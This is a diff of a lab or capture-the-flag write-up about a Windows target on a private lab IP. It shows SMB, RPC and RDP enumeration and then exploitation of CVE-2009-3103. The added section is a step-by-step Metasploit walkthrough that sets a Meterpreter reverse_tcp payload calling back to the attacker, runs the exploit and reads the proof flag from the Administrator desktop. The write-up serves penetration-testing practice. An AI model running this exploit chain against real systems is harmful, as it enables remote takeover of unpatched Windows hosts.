@@ -113,10 +113,6 @@ smbclient -L \\\\192.168.61.40\\
 
 With smbclient we can connect, but nothing is shared with the anonymous user.
 
-<img width="677" height="56" alt="image" src="https://github.com/user-attachments/assets/271efc6b-4c00-4f51-9b96-63eda1221ac0" />
-
-Oh, it’s vulnerable to CVE-2009–3103, https://www.exploit-db.com/exploits/40280.
-
 I then went ahead and checked 135/139 RPC.
 135/TCP - RPC
 
@@ -144,6 +140,9 @@ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 338
 my lab was lagging so i stopped it and start again : new lab ip: 192.168.59.40
 
 This gave us a bunch of info, I then tried to just RDP without creds and to my surprise it worked?
+```bash
+rdesktop 192.168.59.40
+```
 
 <img width="961" height="603" alt="image" src="https://github.com/user-attachments/assets/b311ac08-1306-48bf-8a5e-35605389f163" />
 
@@ -176,10 +175,117 @@ When looking for an exploit for this vulnerability we stumble across the exact s
 
 <img width="665" height="614" alt="image" src="https://github.com/user-attachments/assets/88c66619-a7c7-436e-94e4-7b4292399c4f" />
 
-Let’s grab the PoC from searchsploit.
+
+<img width="677" height="56" alt="image" src="https://github.com/user-attachments/assets/271efc6b-4c00-4f51-9b96-63eda1221ac0" />
+
+
 Initial Foothold
 
-The whole PoC is written in Python2 which we will have to adjust, as well as some other issues.
+Oh, it’s vulnerable to CVE-2009–3103, https://www.exploit-db.com/exploits/40280.
 
-Let’s start by examining it
+It’s a buffer overflow.. Now lets use Metasploit instead — much better reliability:
+
+```bash
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set RHOSTS 192.168.59.40
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your-ip>
+set LPORT 443
+exploit
+```
+
+
+### Step-by-step in msfconsole
+
+1. Start Metasploit
+
+```bash
+msfconsole
+```
+<img width="708" height="349" alt="image" src="https://github.com/user-attachments/assets/adcf31be-19ca-4b16-b9aa-c4361586f656" />
+
+2. Load the module
+
+```bash
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+```
+
+(or shorter: `use ms09_050`)
+<img width="722" height="40" alt="image" src="https://github.com/user-attachments/assets/18e62a92-077d-4b14-b707-b4dc8f44cd85" />
+
+
+3. See available targets (very important — wrong target usually = crash without shell)
+
+```bash
+show targets
+```
+<img width="744" height="155" alt="image" src="https://github.com/user-attachments/assets/fe552740-2632-4316-838e-dffa5edc70cb" />
+
+
+Set the target
+```bash
+set TARGET 0
+```
+<img width="750" height="40" alt="image" src="https://github.com/user-attachments/assets/dbd7de47-c706-483f-98c5-adbbf58ecfd7" />
+
+
+4. Show required options
+
+```bash
+show options
+```
+
+<img width="983" height="541" alt="image" src="https://github.com/user-attachments/assets/c9047f69-f6d1-4534-bf60-a84409afa0dc" />
+
+
+5. Set the most important options
+
+```bash
+set RHOSTS 192.168.59.40
+set LHOST <your-kali-ip>          # e.g. 192.168.49.219 or tun0 IP
+set LPORT 443                     # or 4444, 9001 — avoid well-known ports if possible
+```
+
+<img width="878" height="110" alt="image" src="https://github.com/user-attachments/assets/0e6e00ab-3361-425a-80b1-475589594d95" />
+
+
+Optional but recommended:
+
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp     # default is usually fine
+# or windows/x64/meterpreter/reverse_tcp if target is 64-bit
+```
+
+<img width="974" height="37" alt="image" src="https://github.com/user-attachments/assets/94e8dda1-8246-4911-88e5-e894fc2bbef0" />
+
+
+6. (Optional) Check if the target looks vulnerable  
+   (this module has a basic check — not 100% reliable, but worth running)
+
+```bash
+check
+```
+
+7. Run the exploit
+
+```bash
+exploit
+```
+
+(or shorter: `run` or just `exploit -j` to background it)
+
+<img width="984" height="131" alt="image" src="https://github.com/user-attachments/assets/5dcca77e-6ee3-4d67-8c55-1476cbded44e" />
+
+
+The exploit worked perfectly — you now have a Meterpreter session open:
+
+<img width="795" height="130" alt="image" src="https://github.com/user-attachments/assets/d041aa2e-e0a1-49c0-879d-dbbf8b288687" />
+
+now to find flag. go to desktop
+```bash
+cd \Users\Administrator\Desktop
+dir
+type proof.txt
+```
+<img width="463" height="59" alt="image" src="https://github.com/user-attachments/assets/0d1bd669-8da4-4b01-a5c6-1d3a3b92ff80" />
 
